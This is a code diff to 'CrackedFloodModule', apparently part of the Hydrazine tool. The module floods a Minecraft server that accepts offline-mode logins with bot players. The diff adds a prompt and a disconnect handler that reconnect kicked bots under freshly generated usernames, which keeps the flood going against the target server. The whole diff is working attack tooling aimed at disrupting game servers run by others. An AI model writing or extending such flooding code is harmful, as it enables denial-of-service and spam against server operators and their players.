@@ -7,6 +7,7 @@ import org.spacehq.mc.protocol.MinecraftProtocol;
 import org.spacehq.mc.protocol.packet.ingame.client.ClientChatPacket;
 import org.spacehq.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
 import org.spacehq.packetlib.Client;
+import org.spacehq.packetlib.event.session.DisconnectedEvent;
 import org.spacehq.packetlib.event.session.PacketReceivedEvent;
 import org.spacehq.packetlib.event.session.SessionAdapter;
 
@@ -33,6 +34,8 @@ public class CrackedFloodModule implements Module
 	// Configuration settings are stored in here
 	private ModuleSettings settings = new ModuleSettings(configFile);
 	
+	private Server server;
+	
 	@Override
 	public String getName() 
 	{
@@ -53,7 +56,7 @@ public class CrackedFloodModule implements Module
 				
 		System.out.println(Hydrazine.infoPrefix + "Starting module \'" + getName() + "\'. Press CTRL + C to exit.");
 		
-		Server server = new Server(Hydrazine.settings.getSetting("host"), Integer.parseInt(Hydrazine.settings.getSetting("port")));
+		server = new Server(Hydrazine.settings.getSetting("host"), Integer.parseInt(Hydrazine.settings.getSetting("port")));
 		
 		int bots = 5;
 		int delay = 1000;
@@ -113,7 +116,7 @@ public class CrackedFloodModule implements Module
 				{
 					try 
 					{
-						Thread.sleep(20);
+						Thread.sleep(50);
 					} 
 					catch (InterruptedException e)
 					{
@@ -165,7 +168,7 @@ public class CrackedFloodModule implements Module
 				{
 					try 
 					{
-						Thread.sleep(20);
+						Thread.sleep(50);
 					} 
 					catch (InterruptedException e)
 					{
@@ -196,6 +199,7 @@ public class CrackedFloodModule implements Module
 	{		
 		settings.setProperty("bots", ModuleSettings.askUser("How many bots should be connected to the server?"));
 		settings.setProperty("delay", ModuleSettings.askUser("Delay between connection attempts: "));
+		settings.setProperty("reconnect", String.valueOf(ModuleSettings.askUserYesNo("Reconnect bots after disconnect? (Only works with -gu)")));
 		settings.setProperty("useUsersFromList", String.valueOf(ModuleSettings.askUserYesNo("Load usernames from a list?")));
 		settings.setProperty("sendMessageOnJoin", String.valueOf(ModuleSettings.askUserYesNo("Send message on join?")));
 		
@@ -278,6 +282,34 @@ public class CrackedFloodModule implements Module
 			            }
 			        }
 			    }
+			}
+			
+			@Override
+			public void disconnected(DisconnectedEvent event) 
+			{
+				if(!(event.getReason().contains("The server is full") || event.getReason().contains("Internal network exception")))
+				{
+					if(settings.containsKey("reconnect") && !(settings.getProperty("reconnect").isEmpty()))
+					{
+						if(settings.getProperty("reconnect").equals("true"))
+						{						
+							if(Hydrazine.settings.hasSetting("genuser"))
+							{	
+								String username = Authenticator.getUsername();
+									
+								MinecraftProtocol protocol = new MinecraftProtocol(username);
+								
+								Client client = ConnectionHelper.connect(protocol, server);
+								
+								registerListeners(client);
+							}
+						}
+					}
+				}
+				else if(event.getReason().contains("Internal network exception"))
+				{
+					System.exit(1);
+				}
 			}
 		});
 	}
